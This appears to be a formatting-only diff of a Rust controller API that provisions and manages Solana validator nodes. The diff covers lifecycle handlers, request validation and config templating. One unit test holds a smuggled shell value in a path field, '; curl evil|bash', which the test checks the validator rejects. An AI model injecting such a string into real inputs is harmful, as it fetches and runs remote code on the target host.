@@ -275,7 +275,10 @@ async fn list_nodes(State(state): State<ApiState>) -> impl IntoResponse {
     }
 }
 
-async fn get_node(State(state): State<ApiState>, Path(id): Path<String>) -> impl IntoResponse {
+async fn get_node(
+    State(state): State<ApiState>,
+    Path(id): Path<String>,
+) -> impl IntoResponse {
     match db::get_node(&state.db, &id).await {
         Ok(Some(node)) => {
             let live_status = state.registry.get_status(&id).await;
@@ -294,7 +297,10 @@ async fn get_node(State(state): State<ApiState>, Path(id): Path<String>) -> impl
     }
 }
 
-async fn delete_node(State(state): State<ApiState>, Path(id): Path<String>) -> impl IntoResponse {
+async fn delete_node(
+    State(state): State<ApiState>,
+    Path(id): Path<String>,
+) -> impl IntoResponse {
     match db::delete_node(&state.db, &id).await {
         Ok(true) => {
             state.registry.remove_node(&id).await;
@@ -350,9 +356,7 @@ async fn node_logs_stream(
                     Ok(entry) => {
                         let sse_entry = SseLogEntry::from(entry);
                         let json = serde_json::to_string(&sse_entry).unwrap_or_default();
-                        Some(Ok::<_, std::convert::Infallible>(
-                            Event::default().data(json),
-                        ))
+                        Some(Ok::<_, std::convert::Infallible>(Event::default().data(json)))
                     }
                     // Skip lagged messages.
                     Err(_) => None,
@@ -368,7 +372,10 @@ async fn node_logs_stream(
     }
 }
 
-async fn restart_node(State(state): State<ApiState>, Path(id): Path<String>) -> impl IntoResponse {
+async fn restart_node(
+    State(state): State<ApiState>,
+    Path(id): Path<String>,
+) -> impl IntoResponse {
     let service_name = get_service_name_for_node(&state.db, &id)
         .await
         .unwrap_or_else(|| "solana-validator".to_string());
@@ -386,14 +393,8 @@ async fn restart_node(State(state): State<ApiState>, Path(id): Path<String>) -> 
 
     match state.registry.send_command(&id, cmd).await {
         Ok(()) => {
-            emit_controller_log(
-                &state.registry,
-                &state.db,
-                &id,
-                "info",
-                "Restart command sent",
-            )
-            .await;
+            emit_controller_log(&state.registry, &state.db, &id, "info", "Restart command sent")
+                .await;
             Json(CommandResponse {
                 ok: true,
                 message: "restart command sent".to_string(),
@@ -411,7 +412,10 @@ async fn restart_node(State(state): State<ApiState>, Path(id): Path<String>) -> 
     }
 }
 
-async fn recover_node(State(state): State<ApiState>, Path(id): Path<String>) -> impl IntoResponse {
+async fn recover_node(
+    State(state): State<ApiState>,
+    Path(id): Path<String>,
+) -> impl IntoResponse {
     let service_name = get_service_name_for_node(&state.db, &id)
         .await
         .unwrap_or_else(|| "solana-validator".to_string());
@@ -458,7 +462,10 @@ async fn recover_node(State(state): State<ApiState>, Path(id): Path<String>) -> 
     }
 }
 
-async fn stop_node(State(state): State<ApiState>, Path(id): Path<String>) -> impl IntoResponse {
+async fn stop_node(
+    State(state): State<ApiState>,
+    Path(id): Path<String>,
+) -> impl IntoResponse {
     let service_name = get_service_name_for_node(&state.db, &id)
         .await
         .unwrap_or_else(|| "solana-validator".to_string());
@@ -479,7 +486,8 @@ async fn stop_node(State(state): State<ApiState>, Path(id): Path<String>) -> imp
             if let Err(e) = db::set_lifecycle_state(&state.db, &id, "stopped").await {
                 tracing::warn!(error = %e, "failed to set lifecycle_state to stopped");
             }
-            emit_controller_log(&state.registry, &state.db, &id, "info", "Stop command sent").await;
+            emit_controller_log(&state.registry, &state.db, &id, "info", "Stop command sent")
+                .await;
             Json(CommandResponse {
                 ok: true,
                 message: "stop command sent".to_string(),
@@ -735,15 +743,9 @@ fn validate_provision_request(req: &ProvisionRequest) -> Result<(), String> {
         }
     }
 
-    for (k, v) in req
-        .validator_flags
-        .iter()
-        .chain(req.environment_vars.iter())
-    {
+    for (k, v) in req.validator_flags.iter().chain(req.environment_vars.iter()) {
         if !is_shell_safe(k) || !is_shell_safe(v) {
-            return Err(format!(
-                "flag/env contains a disallowed character: {k:?}={v:?}"
-            ));
+            return Err(format!("flag/env contains a disallowed character: {k:?}={v:?}"));
         }
     }
 
@@ -754,11 +756,7 @@ fn validate_provision_request(req: &ProvisionRequest) -> Result<(), String> {
 fn build_provision_vars(req: &ProvisionRequest) -> HashMap<String, String> {
     let service_name = templates::service_name_for_client(&req.client).to_string();
     let binary_path = templates::binary_path_for_client(&req.client).to_string();
-    let rpc_port = if req.rpc_port == 0 {
-        8899
-    } else {
-        req.rpc_port
-    };
+    let rpc_port = if req.rpc_port == 0 { 8899 } else { req.rpc_port };
     let gossip_port = if req.gossip_port == 0 {
         8001
     } else {
@@ -836,40 +834,39 @@ echo "Wrote /etc/pillar/yellowstone-grpc.json""#
     // Schema validated against fdctl 1.0: explicit genesis hash (no "auto"), 2 MB huge
     // pages (gigantic/1 GB pages need GRUB + reboot), a configurable net provider, and
     // `[gossip] port_check` as the equivalent of Agave's --no-port-check.
-    let (firedancer_toml, fd_configure_stages) = if req.client == "firedancer"
-        || req.client == "frankendancer"
-    {
-        let entrypoints_toml = req
-            .entrypoints
-            .iter()
-            .map(|e| format!("\"{e}\""))
-            .collect::<Vec<_>>()
-            .join(", ");
-        let net_provider = if req.net_provider.is_empty() {
-            "socket"
-        } else {
-            req.net_provider.as_str()
-        };
-        // The socket provider needs no NIC/XDP setup; xdp needs the full stage set.
-        let configure_stages = if net_provider == "xdp" {
-            "all"
-        } else {
-            "hugetlbfs sysctl"
-        };
-        let vote_line = if req.vote_account_keypair_path.is_empty() {
-            String::new()
-        } else {
-            format!(
-                "    vote_account_path = \"{}\"\n",
-                req.vote_account_keypair_path
-            )
-        };
-        let iface_line = if req.net_interface.is_empty() {
-            String::new()
-        } else {
-            format!("    interface = \"{}\"\n", req.net_interface)
-        };
-        let toml = format!(
+    let (firedancer_toml, fd_configure_stages) =
+        if req.client == "firedancer" || req.client == "frankendancer" {
+            let entrypoints_toml = req
+                .entrypoints
+                .iter()
+                .map(|e| format!("\"{e}\""))
+                .collect::<Vec<_>>()
+                .join(", ");
+            let net_provider = if req.net_provider.is_empty() {
+                "socket"
+            } else {
+                req.net_provider.as_str()
+            };
+            // The socket provider needs no NIC/XDP setup; xdp needs the full stage set.
+            let configure_stages = if net_provider == "xdp" {
+                "all"
+            } else {
+                "hugetlbfs sysctl"
+            };
+            let vote_line = if req.vote_account_keypair_path.is_empty() {
+                String::new()
+            } else {
+                format!(
+                    "    vote_account_path = \"{}\"\n",
+                    req.vote_account_keypair_path
+                )
+            };
+            let iface_line = if req.net_interface.is_empty() {
+                String::new()
+            } else {
+                format!("    interface = \"{}\"\n", req.net_interface)
+            };
+            let toml = format!(
                 "user = \"sol\"\n\n\
                  [log]\n    level_stderr = \"INFO\"\n\n\
                  [gossip]\n    entrypoints = [{ep}]\n    port_check = {port_check}\n\n\
@@ -892,10 +889,10 @@ echo "Wrote /etc/pillar/yellowstone-grpc.json""#
                 net_provider = net_provider,
                 iface_line = iface_line,
             );
-        (toml, configure_stages.to_string())
-    } else {
-        (String::new(), String::new())
-    };
+            (toml, configure_stages.to_string())
+        } else {
+            (String::new(), String::new())
+        };
 
     // Build start_limit and log_rate_limit lines
     let start_limit_line = if req.start_limit_disable {
@@ -1008,10 +1005,7 @@ async fn provision_node(
     if let Err(msg) = validate_provision_request(&req) {
         return (
             StatusCode::BAD_REQUEST,
-            Json(CommandResponse {
-                ok: false,
-                message: msg,
-            }),
+            Json(CommandResponse { ok: false, message: msg }),
         )
             .into_response();
     }
@@ -1070,10 +1064,7 @@ async fn provision_node(
         "Provision command sent: {} {} ({})",
         req.client, req.version, req.cluster
     );
-    let description = format!(
-        "Provision {} v{} on {}",
-        req.client, req.version, req.cluster
-    );
+    let description = format!("Provision {} v{} on {}", req.client, req.version, req.cluster);
 
     // Save provision config JSON for the node record
     let provision_json = serde_json::to_string(&req).unwrap_or_default();
@@ -1383,7 +1374,8 @@ struct VersionInfoResponse {
 }
 
 async fn version_info(State(state): State<ApiState>) -> impl IntoResponse {
-    let info = crate::update_checker::get_or_refresh(VERSION, &state.update_info).await;
+    let info =
+        crate::update_checker::get_or_refresh(VERSION, &state.update_info).await;
     Json(VersionInfoResponse {
         current_version: VERSION.to_string(),
         controller_update: info.controller_update,
@@ -1462,7 +1454,10 @@ sudo systemctl restart pillar-controller
     .into_response()
 }
 
-async fn upgrade_agent(State(state): State<ApiState>, Path(id): Path<String>) -> impl IntoResponse {
+async fn upgrade_agent(
+    State(state): State<ApiState>,
+    Path(id): Path<String>,
+) -> impl IntoResponse {
     let info = state.update_info.read().await;
     let update = match &info.agent_update {
         Some(u) => u.clone(),
@@ -1745,8 +1740,8 @@ async fn grafana_proxy(
         }
     };
 
-    let status =
-        StatusCode::from_u16(upstream_resp.status().as_u16()).unwrap_or(StatusCode::BAD_GATEWAY);
+    let status = StatusCode::from_u16(upstream_resp.status().as_u16())
+        .unwrap_or(StatusCode::BAD_GATEWAY);
     let mut resp_builder = Response::builder().status(status);
 
     for (name, value) in upstream_resp.headers() {
@@ -1773,9 +1768,7 @@ mod tests {
 
     #[test]
     fn accepts_a_normal_request() {
-        let r = req(
-            r#"{"client":"agave","version":"2.1.6","cluster":"testnet","ledger_path":"/mnt/ledger"}"#,
-        );
+        let r = req(r#"{"client":"agave","version":"2.1.6","cluster":"testnet","ledger_path":"/mnt/ledger"}"#);
         assert!(validate_provision_request(&r).is_ok());
     }
 
@@ -1787,9 +1780,7 @@ mod tests {
 
     #[test]
     fn rejects_injection_in_a_path() {
-        let r = req(
-            r#"{"client":"agave","version":"2.1.6","cluster":"testnet","ledger_path":"/mnt; curl evil|bash"}"#,
-        );
+        let r = req(r#"{"client":"agave","version":"2.1.6","cluster":"testnet","ledger_path":"/mnt; curl evil|bash"}"#);
         assert!(validate_provision_request(&r).is_err());
     }
 
